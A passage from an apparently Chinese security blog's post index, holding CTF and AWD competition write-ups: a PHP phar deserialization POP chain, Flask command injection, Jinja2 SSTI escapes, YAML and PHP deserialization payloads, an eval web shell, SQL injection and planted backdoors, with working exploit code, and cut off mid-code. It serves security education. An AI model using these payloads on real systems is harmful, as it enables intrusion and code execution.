class=\"string\">\"REMOTE_ADDR\"</span>]).<span class=\"string\">\".jpg\"</span>; </span><br><span class=\"line\">    <span class=\"comment\">//mkdir(\"upload\",0777); </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file_exists(<span class=\"string\">\"upload/\"</span> . $filename)) &#123; </span><br><span class=\"line\">        unlink($filename); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    move_uploaded_file($_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"tmp_name\"</span>],<span class=\"string\">\"upload/\"</span> . $filename); </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'</span>; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload_file</span><span class=\"params\">()</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">global</span> $_FILES; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(upload_file_check()) &#123; </span><br><span class=\"line\">        upload_file_do(); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload_file_check</span><span class=\"params\">()</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">global</span> $_FILES; </span><br><span class=\"line\">    $allowed_types = <span class=\"keyword\">array</span>(<span class=\"string\">\"gif\"</span>,<span class=\"string\">\"jpeg\"</span>,<span class=\"string\">\"jpg\"</span>,<span class=\"string\">\"png\"</span>); </span><br><span class=\"line\">    $temp = explode(<span class=\"string\">\".\"</span>,$_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"name\"</span>]); </span><br><span class=\"line\">    $extension = end($temp); </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($extension)) &#123; </span><br><span class=\"line\">        <span class=\"comment\">//echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; </span></span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'</span>; </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>file.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">header(<span class=\"string\">\"content-type:text/html;charset=utf-8\"</span>);  </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'function.php'</span>; </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'class.php'</span>; </span><br><span class=\"line\">ini_set(<span class=\"string\">'open_basedir'</span>,<span class=\"string\">'/var/www/html/'</span>); </span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>] ? $_GET[<span class=\"string\">'file'</span>] : <span class=\"string\">\"\"</span>; </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($file)) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;h2&gt;There is no file to show!&lt;h2/&gt;\"</span>; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">$show = <span class=\"keyword\">new</span> Show(); </span><br><span class=\"line\"><span class=\"keyword\">if</span>(file_exists($file)) &#123; </span><br><span class=\"line\">    $show-&gt;source = $file; </span><br><span class=\"line\">    $show-&gt;_show(); </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($file))&#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'file doesn\\'t exists.'</span>); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>class.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C1e4r</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $test;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;str = $name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;test = <span class=\"keyword\">$this</span>-&gt;str;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;test;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Show</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $source;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;source = $file;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;source;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $content = <span class=\"keyword\">$this</span>-&gt;str[<span class=\"string\">'str'</span>]-&gt;source;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span><span class=\"params\">($key,$value)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;$key = $value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_show</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/http|https|file:|gopher|dict|\\.\\.|f1ag/i'</span>,<span class=\"keyword\">$this</span>-&gt;source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'hacker!'</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            highlight_file(<span class=\"keyword\">$this</span>-&gt;source);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/http|https|file:|gopher|dict|\\.\\./i\"</span>, <span class=\"keyword\">$this</span>-&gt;source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"hacker~\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;source = <span class=\"string\">\"index.php\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $params;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;params = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($key)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get($key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($key)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;params[$key])) &#123;</span><br><span class=\"line\">            $value = <span class=\"keyword\">$this</span>-&gt;params[$key];</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $value = <span class=\"string\">\"index.php\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;file_get($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">file_get</span><span class=\"params\">($value)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $text = base64_encode(file_get_contents($value));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $text;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>看到出现了类，思路就基本上是php反序列化了，但是代码中并没有反序列化函数的调用，但是在file.php中看到存在file_exists()函数，该函数是可以通过phar协议实现反序列化的<a href=\"https://www.freebuf.com/company-information/187071.html\" target=\"_blank\" rel=\"noopener\">参考文章</a>，接下里的思路就是构造pop链，题目中有提示 <code>&lt;!--flag is in f1ag.php--&gt;</code> ，所以要尝试读取f1ag.php文件</p>\n<p>在Show类的<strong>show方法中过滤了f1ag字段，那么这个方法应该不行，看了大佬的pop链构造思路，Test类中有file_get_contents()函数可以读取文件内容，所以可以尝试反序列化Test类，file_get()方法被get方法调用，而get方法是被</strong>get()魔术方法调用</p>\n<blockquote>\n<p> 当读取不可访问属性的值时，__get() 会被调用。也就是，当想要获取一个类的私有属性，或者获取一个类并为定义的属性时。该魔术方法会被调用。 </p>\n</blockquote>\n<p>可以看到我们需要访问一个不可访问的变量，在Show中的<strong>toString()方法中，运行了 <code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source;</code>，该语句会访问不存在的变量source，所以接下来就是要触发</strong>toString()方法，正好在C1e4r类中<strong>destruct()类中 <code>echo $this-&gt;test;</code> 则会触发</strong>toString()方法，至此pop链构造完成:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.C1e4r类的__destruct()中的echo $this-&gt;test;</span><br><span class=\"line\">2.Show中的__toString()中的$content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;</span><br><span class=\"line\">3.Test中的__get()方法</span><br><span class=\"line\">4.利用file_get_contens()读文件</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"keyword\">new</span> Test();</span><br><span class=\"line\">$a-&gt;params = <span class=\"keyword\">array</span>(<span class=\"string\">\"source\"</span>=&gt;<span class=\"string\">'/var/www/html/f1ag.php'</span>);</span><br><span class=\"line\">$b = <span class=\"keyword\">new</span> Show(<span class=\"string\">'index.php'</span>);</span><br><span class=\"line\">$b-&gt;str[<span class=\"string\">'str'</span>] = $a;</span><br><span class=\"line\">$c= <span class=\"keyword\">new</span> C1e4r($b);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($c);</span><br><span class=\"line\">$obj = unserialize(<span class=\"string\">'O:5:\"C1e4r\":2:&#123;s:4:\"test\";N;s:3:\"str\";O:4:\"Show\":2:&#123;s:6:\"source\";s:9:\"index.php\";s:3:\"str\";a:1:&#123;s:3:\"str\";O:4:\"Test\":2:&#123;s:4:\"file\";N;s:6:\"params\";a:1:&#123;s:6:\"source\";s:22:\"/var/www/html/f1ag.php\";&#125;&#125;&#125;&#125;&#125;'</span>);</span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">'exploit.phar'</span>);</span><br><span class=\"line\">$phar-&gt;startBuffering();</span><br><span class=\"line\">$phar-&gt;addFromString(<span class=\"string\">'test.php'</span>, <span class=\"string\">'test'</span>);</span><br><span class=\"line\">$phar-&gt;setStub(<span class=\"string\">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class=\"line\">$phar-&gt;setMetadata($obj);</span><br><span class=\"line\">$phar-&gt;stopBuffering();</span><br><span class=\"line\">rename(<span class=\"string\">'exploit.phar'</span>, <span class=\"string\">'skyfuck.gif'</span>);</span><br></pre></td></tr></table></figure>\n<p>然后提交即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">phar:&#x2F;&#x2F;upload&#x2F;680b7502eaac53cac3f3eca74d50f537.jpg</span><br></pre></td></tr></table></figure>\n<!-- SWPUCTF{Php_un$eri4liz3_1s_Fu^!} -->\n","categories":["复现"],"tags":["CTF","Web","Misc"]},{"title":"萌宠养成记","url":"/2018/07/24/Train-my-pet/","content":"<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n<div id=\"hbe-security\">\n  <div class=\"hbe-input-container\">\n  <input type=\"password\" class=\"hbe-form-control\" id=\"pass\" placeholder=\"What's my pet's name?\" />\n    <label for=\"pass\">What's my pet's name?</label>\n    <div class=\"bottom-line\"></div>\n  </div>\n</div>\n<div id=\"decryptionError\" style=\"display: none;\">Incorrect Password!</div>\n<div id=\"noContentError\" style=\"display: none;\">No content to display!</div>\n<div id=\"encrypt-blog\" style=\"display:none\">\\n</div>\n<script src=\"/lib/crypto-js.js\"></script><script src=\"/lib/blog-encrypt.js\"></script><link href=\"/css/blog-encrypt.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["随笔"],"tags":["Essay"]},{"title":"应急挑战杯2019复现","url":"/2020/09/13/YJTZB2019/","content":"<p>历史文章补发</p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>第一次线下AWD，打的有些遗憾，不过还是学到了许多东西，因为是awd的原因，题目整体难度挺低的，将题目完整复现一下</p>\n<a id=\"more\"></a>\n<h1 id=\"Flask商城\"><a href=\"#Flask商城\" class=\"headerlink\" title=\"Flask商城\"></a>Flask商城</h1><h2 id=\"popen-命令执行\"><a href=\"#popen-命令执行\" class=\"headerlink\" title=\"popen()命令执行\"></a>popen()命令执行</h2><p>在search路由处存在命令执行漏洞</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> request.method == <span class=\"string\">\"POST\"</span>:</span><br><span class=\"line\">    url = request.form[<span class=\"string\">'search'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    msg = os.popen(url).read() </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> msg == <span class=\"string\">''</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"search.html\"</span>, msg=msg)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"search.html\"</span>, msg=<span class=\"string\">\"Error.Check your command.\"</span>)</span><br></pre></td></tr></table></figure>\n<p>非常明显的一个命令执行，popen函数用于从一个命令打开一个管道，会返回一个文件对象，所以可以被用来执行任意系统命令，由于比赛使用的gunicorn服务器，很多人修了洞之后却无法生效（因为没有重启gunicorn服务…）</p>\n<h2 id=\"SSTI漏洞\"><a href=\"#SSTI漏洞\" class=\"headerlink\" title=\"SSTI漏洞\"></a>SSTI漏洞</h2><p>在定义404返回的路由处存在ssti<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.errorhandler(404)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">page_not_found</span><span class=\"params\">(e)</span>:</span></span><br><span class=\"line\">    template = <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">        &#123;%% block body %%&#125;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;div class=\"center-content error\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;h1&gt;哇哦，This page doesn't exist.&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;h3&gt;这里什么都没有呢٩(๑❛ᴗ❛๑)۶&lt;/h3&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &#123;%% endblock %%&#125;</span></span><br><span class=\"line\"><span class=\"string\">        '''</span> % (request.url)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template_string(template), <span class=\"number\">404</span></span><br></pre></td></tr></table></figure></p>\n<p>找到SSTI漏洞，接下来就是沙盒逃逸，可用payload如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;cat &#x2F;flag &gt; &#x2F;home&#x2F;snow&#x2F;sandbox&quot;)&#39;)&#39;</span><br></pre></td></tr></table></figure>\n<p>实例调用__class__属性时会指向该实例所对应的类；由于python允许多重继承，__mro__可以得到该类继承的父类，builtins是解释器自动导入的内置类，__import__()函数能够动态导入一些类从而进行命令执行</p>\n<p>由于flask使用的模板渲染引擎是jinja2，所以payload还可以更简单一些，我们其实随便输入字符串都是有用的，jinja会生成一个undefined类<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code>，我们可以直接进行逃逸</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">vvv.__class__.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;cat &#x2F;flag &gt; &#x2F;home&#x2F;snow&#x2F;sandbox&quot;)&#39;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"yaml反序列化\"><a href=\"#yaml反序列化\" class=\"headerlink\" title=\"yaml反序列化\"></a>yaml反序列化</h2><p>yaml库在使用yaml.load()方法解析yaml文件时会存在反序列化漏洞，可以使用yaml.safe_load()方法来避免该漏洞</p>\n<p>想要序列化的类名必须使用上下文中存在的类名，但是类名中不一定有执行命令的相应方法，所以最好是通过构造标准类或类函数来实现命令执行，编辑如下文件并上传即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">*-* exp.yml *-*</span><br><span class=\"line\"></span><br><span class=\"line\">!!python&#x2F;object&#x2F;new:subprocess.check_output [[&quot;cat&quot;,&quot;&#x2F;flag&quot;]]</span><br></pre></td></tr></table></figure>\n<h1 id=\"easyweb\"><a href=\"#easyweb\" class=\"headerlink\" title=\"easyweb\"></a>easyweb</h1><h2 id=\"1、-反序列化\"><a href=\"#1、-反序列化\" class=\"headerlink\" title=\"1、 反序列化\"></a>1、 反序列化</h2><p>反序列化漏洞有两处</p>\n<p>第一处在首页存在提示</p>\n<p><img src=\"/2020/09/13/YJTZB2019/1.png\" alt></p>\n<p>定位到cacf.php，查看代码，可以通过反序列化进行文件写入<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">chybeta</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> $test = <span class=\"string\">'pcaq'</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $fp = fopen(<span class=\"string\">\"log.php\"</span>,<span class=\"string\">\"w\"</span>) ;       </span><br><span class=\"line\">        fwrite($fp,<span class=\"keyword\">$this</span>-&gt;test);</span><br><span class=\"line\">        fclose($fp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>反序列化写入shell<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">chybeta</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> $test = <span class=\"string\">'&lt;?php eval($_GET[\"snow\"]);?&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> chybeta();</span><br><span class=\"line\">$a = serialize($a);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"/2020/09/13/YJTZB2019/2.png\" alt></p>\n<p>第二处在common/home.php中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">home</span></span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> $method;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $args;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($method, $args)</span> </span>&#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">      </span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;method = $method;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;args = $args;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (in_array(<span class=\"keyword\">$this</span>-&gt;method, <span class=\"keyword\">array</span>(<span class=\"string\">\"ping\"</span>))) &#123;</span><br><span class=\"line\">            call_user_func_array(<span class=\"keyword\">array</span>(<span class=\"keyword\">$this</span>, <span class=\"keyword\">$this</span>-&gt;method), <span class=\"keyword\">$this</span>-&gt;args);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ping</span><span class=\"params\">($host)</span></span>&#123;</span><br><span class=\"line\">        system(<span class=\"string\">\"ping -c 2 $host\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">waf</span><span class=\"params\">($str)</span></span>&#123;</span><br><span class=\"line\">        $str=str_replace(<span class=\"string\">' '</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $str;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>(<span class=\"keyword\">$this</span>-&gt;args <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;args[$k] = <span class=\"keyword\">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=@$_POST[<span class=\"string\">'a'</span>];</span><br><span class=\"line\">@unserialize(base64_decode($a));</span><br></pre></td></tr></table></figure>\n<p>在析构函数中通过调用ping函数可以实现命令执行，但是在waf函数中屏蔽了空格，用$IFS可以绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">home</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $method;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $args;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($method, $args)</span> </span>&#123;      </span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;method = $method;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;args = $args;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$arr = <span class=\"keyword\">array</span>(<span class=\"string\">\"127.0.0.1;cat\\$IFS/flag\"</span>);</span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> home(<span class=\"string\">\"ping\"</span> ,$arr);</span><br><span class=\"line\">$obj = serialize($obj);</span><br><span class=\"line\">$obj = base64_encode($obj);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $obj;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/13/YJTZB2019/8.png\" alt></p>\n<h2 id=\"2、万能密码\"><a href=\"#2、万能密码\" class=\"headerlink\" title=\"2、万能密码\"></a>2、万能密码</h2><p>登录处存在sql注入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql=<span class=\"string\">\"select * from users where username='$username' and password='$password'\"</span>;</span><br></pre></td></tr></table></figure>\n<p>可以通过万能密码登录</p>\n<p>密码更新处同样也存在update注入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql=<span class=\"string\">\"update users set password='$password' where id='\"</span>.$_SESSION[<span class=\"string\">'id'</span>].<span class=\"string\">\"';\"</span>;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3、命令执行\"><a href=\"#3、命令执行\" class=\"headerlink\" title=\"3、命令执行\"></a>3、命令执行</h2><p>在User.php中存在ping函数可以进行命令执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ping</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $host = $_POST[<span class=\"string\">'host'</span>];</span><br><span class=\"line\">        system(<span class=\"string\">\"ping -c $host\"</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/13/YJTZB2019/3.png\" alt></p>\n<h2 id=\"4、预置后门\"><a href=\"#4、预置后门\" class=\"headerlink\" title=\"4、预置后门\"></a>4、预置后门</h2><p>预置后门有两个，一个在include/shell.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"keyword\">eval</span>($_POST[<span class=\"string\">'admin_ccmd'</span>]);</span><br></pre></td></tr></table></figure>\n<p>另一个在org/smarty/Autofoucer.php</p>\n<p><img src=\"/2020/09/13/YJTZB2019/7.png\" alt></p>\n<h2 id=\"5、日志文件写入\"><a href=\"#5、日志文件写入\" class=\"headerlink\" title=\"5、日志文件写入\"></a>5、日志文件写入</h2><p>根目录下log.php会记录网站访问记录，可以通过构造恶意访问写入shell</p>\n<p><img src=\"/2020/09/13/YJTZB2019/9.png\" alt></p>\n<p><img src=\"/2020/09/13/YJTZB2019/4.png\" alt></p>\n<h2 id=\"6、上传漏洞\"><a href=\"#6、上传漏洞\" class=\"headerlink\" title=\"6、上传漏洞\"></a>6、上传漏洞</h2><p>登录之后存在上传界面，查看上传逻辑代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">$this</span>-&gt;notallow=<span class=\"keyword\">array</span>(<span 